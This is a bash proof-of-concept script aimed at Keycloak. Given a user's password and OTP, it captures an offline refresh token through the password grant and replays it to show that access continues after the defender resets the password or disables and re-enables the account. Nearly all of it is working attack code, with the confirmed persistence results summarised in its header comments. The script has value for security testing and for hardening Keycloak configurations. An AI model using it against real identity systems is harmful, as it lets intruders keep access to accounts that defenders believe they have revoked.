#!/bin/bash
# ============================================================
# Keycloak Offline Token Persistence 
#
# Demonstrates that offline tokens survive password reset and account
# disable/re-enable cycles under the following Keycloak config conditions:
#
#   revokeRefreshToken=false           -> no rotation, same token reusable indefinitely
#   offlineSessionMaxLifespanEnabled=false -> no hard expiry on offline sessions
#   directAccessGrantsEnabled=true     -> offline token obtainable headlessly via ROPC
#                                         (scope=offline_access, no browser flow)
#
# ref.: https://www.keycloak.org/docs/latest/server_admin/index.html 
# All three confirmed on KC 26.6.4. Behavior likely applies to other versions where these settings are active.
#
# [!] For authorized security testing only.
#
# Usage:
#   capture : obtain and store an offline token (consumes OTP once)
#   replay  : replay the stored token and observe validity
#
#   bash kc_offline_persist.sh capture <KC_URL> <REALM> <CLIENT> <USER> <PASS> [OTP]
#   bash kc_offline_persist.sh replay  <KC_URL> <REALM> <CLIENT> [TAG]
#
# Examples:
#   bash kc_offline_persist.sh capture https://kc.example.com myrealm myapp-frontend jdoe P@ssw0rd 123456
#   bash kc_offline_persist.sh replay  https://kc.example.com myrealm myapp-frontend T0-baseline
#   bash kc_offline_persist.sh replay  https://kc.example.com myrealm myapp-frontend T1-post-reset
#
# Persistence test sequence (results confirmed on authorized target):
#   1. capture                    -> T0 baseline: ok:true
#   2. [defender resets password] -> replay T1-post-reset
#                                    confirmed: ok:true - token survives password reset
#
#   3. [defender disables acct]   -> replay T2-disabled
#                                    confirmed: ok:false - disable blocks refresh
#                                    (session not destroyed, just blocked while disabled;
#                                     same UID, same sid - session resumes on = re-enable)
#
#   4. [defender re-enables acct] -> replay T3-reenabled
#                                    confirmed: ok:true - same session resumes, same sid
#                                    (disable/re-enable = suspension, not revocation)
#
# Token storage: ./kc_offline_<REALM>.tok (chmod 600)
# ============================================================

MODE="${1:-}"
STORE_PREFIX="./kc_offline"

jwtpayload() {
    echo "$1" | cut -d. -f2 | sed 's/-/+/g; s/_/\//g' | base64 -d 2>/dev/null
}

replay_token() {
    local KC="$1" REALM="$2" CLIENT="$3" TAG="${4:-replay}" STORE="$5"
    local REF; REF=$(cat "$STORE" 2>/dev/null)
    [ -z "$REF" ] && { echo "[!] no stored token at $STORE - run capture first"; exit 1; }

    local TS; TS=$(date '+%Y-%m-%d %H:%M:%S %Z')
    local R; R=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
        --data-urlencode "grant_type=refresh_token" \
        --data-urlencode "client_id=$CLIENT" \
        --data-urlencode "refresh_token=$REF")
    local AT; AT=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)

    echo "------------------------------------------------------------"
    echo "[$TAG] $TS"
    if [ -n "$AT" ]; then
        echo "  ok: true   (access_token issued from stored offline refresh)"
        jwtpayload "$AT" | python3 -c "
import sys,json,time
try:
    d=json.load(sys.stdin)
    iat=d.get('iat'); exp=d.get('exp')
    print('  user :', d.get('preferred_username'))
    print('  sid  :', d.get('sid'))
    print('  iat  :', iat, '('+time.strftime('%H:%M:%S',time.localtime(iat))+')' if iat else '')
    print('  exp  :', exp, '('+time.strftime('%H:%M:%S',time.localtime(exp))+')' if exp else '')
except: pass
" 2>/dev/null
    else
        echo "  ok: false"
        echo "$R" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print('  error:', d.get('error'), '/', d.get('error_description'))
" 2>/dev/null
    fi
}

case "$MODE" in
    capture)
        KC="${2:-}"; REALM="${3:-}"; CLIENT="${4:-}"; USER="${5:-}"; PASS="${6:-}"; OTP="${7:-}"
        [ -z "$KC" ] || [ -z "$REALM" ] || [ -z "$CLIENT" ] || [ -z "$USER" ] || [ -z "$PASS" ] && {
            echo "[!] Usage: bash $0 capture <KC_URL> <REALM> <CLIENT> <USER> <PASS> [OTP]"
            exit 1
        }
        STORE="${STORE_PREFIX}_${REALM}.tok"

        echo "[*] capturing offline token via ROPC (scope=offline_access)"
        echo "    target : $KC  realm=$REALM  client=$CLIENT"

        BODY="grant_type=password&client_id=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$CLIENT")&username=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$USER")&password=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PASS")&scope=openid+offline_access"
        [ -n "$OTP" ] && BODY="$BODY&otp=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OTP")"

        R0=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "$BODY")

        REF=$(echo "$R0" | python3 -c "import sys,json;print(json.load(sys.stdin).get('refresh_token',''))" 2>/dev/null)
        ERR=$(echo "$R0" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('error',''))" 2>/dev/null)

        [ -z "$REF" ] && {
            echo "[!] capture failed: $ERR"
            echo "$R0" | head -c 300; echo
            exit 1
        }

        TYP=$(jwtpayload "$REF" | python3 -c "import sys,json;print(json.load(sys.stdin).get('typ',''))" 2>/dev/null)
        EXP=$(jwtpayload "$REF" | python3 -c "import sys,json;print(json.load(sys.stdin).get('exp','None'))" 2>/dev/null)

        echo "  refresh typ : $TYP"
        echo "  refresh exp : $EXP  (None = no hard expiry)"
        [ "$TYP" != "Offline" ] && echo "  [!] warning: typ != Offline - offline_access scope may not be granted for this user/client"

        umask 077; echo "$REF" > "$STORE"
        echo "  stored -> $STORE"
        echo ""
        echo "[*] baseline replay (T0):"
        replay_token "$KC" "$REALM" "$CLIENT" "T0-baseline" "$STORE"
        echo ""
        echo "[i] now trigger a defender action (password reset, disable/enable) then:"
        echo "    bash $0 replay $KC $REALM $CLIENT <TAG>"
        ;;

    replay)
        KC="${2:-}"; REALM="${3:-}"; CLIENT="${4:-}"; TAG="${5:-replay}"
        [ -z "$KC" ] || [ -z "$REALM" ] || [ -z "$CLIENT" ] && {
            echo "[!] Usage: bash $0 replay <KC_URL> <REALM> <CLIENT> [TAG]"
            exit 1
        }
        STORE="${STORE_PREFIX}_${REALM}.tok"
        replay_token "$KC" "$REALM" "$CLIENT" "$TAG" "$STORE"
        ;;

    *)
        echo "Usage:"
        echo "  bash $0 capture <KC_URL> <REALM> <CLIENT> <USER> <PASS> [OTP]"
        echo "  bash $0 replay  <KC_URL> <REALM> <CLIENT> [TAG]"
        exit 1
        ;;
esac
